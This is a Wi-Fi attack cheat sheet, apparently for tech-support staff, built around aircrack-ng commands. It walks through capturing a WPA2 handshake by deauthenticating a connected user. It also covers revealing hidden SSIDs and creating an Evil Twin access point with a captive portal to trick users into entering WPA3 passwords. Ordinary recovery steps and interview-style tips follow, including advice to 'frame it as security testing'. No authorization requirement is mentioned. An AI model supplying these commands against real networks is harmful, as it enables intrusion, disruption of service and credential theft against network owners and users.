Overview

This is your Master Cheat Sheet. As a Tech Support professional, having this "Playbook" ready will make you look like a wizard when a student's machine hangs or when you need to perform an audit yourself.

/ 01

Phase 1: The "Attack" Sequence (WPA2 Audit)

This is the standard order of operations for capturing a handshake.

Step Command What it does
1. Identify iwconfig Identifies your interface name (e.g., wlan0).
2. Prep sudo airmon-ng check kill Kills background tasks that interfere with monitor mode.
3. Start sudo airmon-ng start wlan0 Puts the card in Monitor Mode (creates wlan0mon).
4. Scan sudo airodump-ng wlan0mon Shows all nearby networks and their BSSIDs.
5. Target sudo airodump-ng -c [channel] --bssid [MAC] -w [file] wlan0mon Focuses on one router and starts saving the capture.
6. Deauth sudo aireplay-ng -0 5 -a [BSSID] -c [Client_MAC] wlan0mon Kicks a user off so they reconnect, giving you the Handshake.
💡 Pro Tip: Always run sudo airmon-ng check kill before starting monitor mode. This kills NetworkManager and wpa_supplicant which can interfere with packet injection.

Example Workflow:

# 1. Identify interface
iwconfig
# Output: wlan0    IEEE 802.11  ESSID:off/any

# 2. Kill interfering processes
sudo airmon-ng check kill

# 3. Start monitor mode
sudo airmon-ng start wlan0
# Creates wlan0mon

# 4. Scan for targets
sudo airodump-ng wlan0mon
# Note target: AA:BB:CC:DD:EE:FF on channel 6

# 5. Focus on target and capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 6. In another terminal, deauth a client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
/ 02

Phase 2: Obstacles & How to Bypass Them

Obstacle A: "Device or Resource Busy"

The Cause: You didn't run check kill, or a process like wpa_supplicant restarted itself.

The Bypass:

# Run check kill twice to be sure
sudo airmon-ng check kill
sudo airmon-ng check kill

# Force kill specific processes if needed
sudo pkill -9 wpa_supplicant
sudo pkill -9 NetworkManager

# Check what's using the interface
sudo lsof | grep wlan0

Obstacle B: "Fixed Channel -1" (Airodump-ng error)

The Cause: A conflict between the kernel and the driver.

The Bypass:

# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Manually set monitor mode
sudo iwconfig wlan0 mode monitor
sudo ip link set wlan0 up

# Verify it worked
iwconfig wlan0
# Should show: Mode:Monitor

# Now try airodump again
sudo airodump-ng wlan0

Obstacle C: "WPA3 Target" (No handshake capture)

The Cause: The network is using SAE (Simultaneous Authentication of Equals). Dictionary attacks won't work offline.

The Bypass: You cannot bypass SAE with a simple dictionary attack. You must switch to a Social Engineering approach (like an Evil Twin portal) to trick the user into typing the password.

# Create an Evil Twin with the same SSID
sudo airbase-ng -e "TargetSSID" -c 6 wlan0mon

# Set up a captive portal (using bettercap, hostapd, etc.)

Obstacle D: "Hidden SSID"

The Cause: The router isn't broadcasting its name (ESSID).

The Bypass: Run airodump-ng on that specific BSSID. When a legitimate user connects, the name will "de-cloak" and appear in your terminal.

# Focus on the specific BSSID
sudo airodump-ng -c [channel] --bssid [MAC] wlan0mon

# Wait for a client to connect - the SSID will appear
🔍 How it works: Even though the router doesn't broadcast the SSID, clients still send it in probe requests and association frames. When a client connects, airodump-ng captures that frame and reveals the hidden SSID.
/ 03

Phase 3: The "Recovery" Sequence (Back to Work)

Crucial for Tech Support: Use this when a student says "My Wi-Fi is gone!"

Standard Recovery (Quick & Clean):

# 1. Stop Monitor Mode
sudo airmon-ng stop wlan0mon

# 2. Reset Hardware to Managed Mode
sudo iwconfig wlan0 mode managed

# 3. Unblock Radio (if blocked)
sudo nmcli radio wifi on
rfkill unblock wifi

# 4. Restart Network Services
sudo systemctl restart NetworkManager
sudo systemctl restart wpa_supplicant

# 5. Verify Wi-Fi is working
nmcli dev status
iwconfig wlan0

The "Nuclear" Fix (If managed=false error):

# 1. Edit NetworkManager config
sudo nano /etc/NetworkManager/NetworkManager.conf

# Find this section and change to:
[ifupdown]
managed=true

# Save and exit (Ctrl+X, Y, Enter)

# 2. Restart NetworkManager
sudo systemctl restart NetworkManager

# 3. If still broken, reload the driver
sudo modprobe -r iwlwifi  # or ath9k, etc.
sudo modprobe iwlwifi

# 4. Last resort: reboot
sudo reboot

Quick Troubleshooting Commands:

# Check interface status
iwconfig
ip link show
nmcli dev status

# Check if radio is blocked
rfkill list

# Restart everything at once
sudo systemctl restart NetworkManager wpa_supplicant

# Force interface up
sudo ip link set wlan0 up
/ 04

Professional Tips

💼 1. Always Mention the "Check Kill"

"Before enabling monitor mode, I always run airmon-ng check kill to ensure NetworkManager and wpa_supplicant don't interfere with packet injection. This demonstrates understanding of how system services can conflict with raw socket operations."

📡 2. Distinguish Between BSSID and ESSID

"The BSSID operates at Layer 2—it's the MAC address of the access point. The ESSID is the human-readable network name. When capturing a handshake, we target the BSSID specifically because MAC addresses don't change, while SSIDs can be hidden or spoofed."

🔒 3. Mention SAE/WPA3

"Modern networks increasingly use WPA3 with SAE (Simultaneous Authentication of Equals), which is resistant to offline dictionary attacks. In these cases, traditional handshake capture is ineffective—you'd need to pivot to social engineering methods like captive portal attacks or target legacy protocols like WPS."

🧠 4. Talk About the OSI Model

"Wi-Fi auditing operates primarily at Layer 2 (Data Link) and Layer 1 (Physical). Deauthentication attacks exploit management frames that aren't encrypted in 802.11 standards—this is a design limitation of the protocol itself, not a vulnerability in specific implementations."

⚖️ 5. Frame It as "Security Testing"

"This methodology is part of a comprehensive wireless security assessment. By attempting to capture handshakes and test network resilience, we can identify weak configurations and recommend upgrades to WPA3 or 802.11w management frame protection."
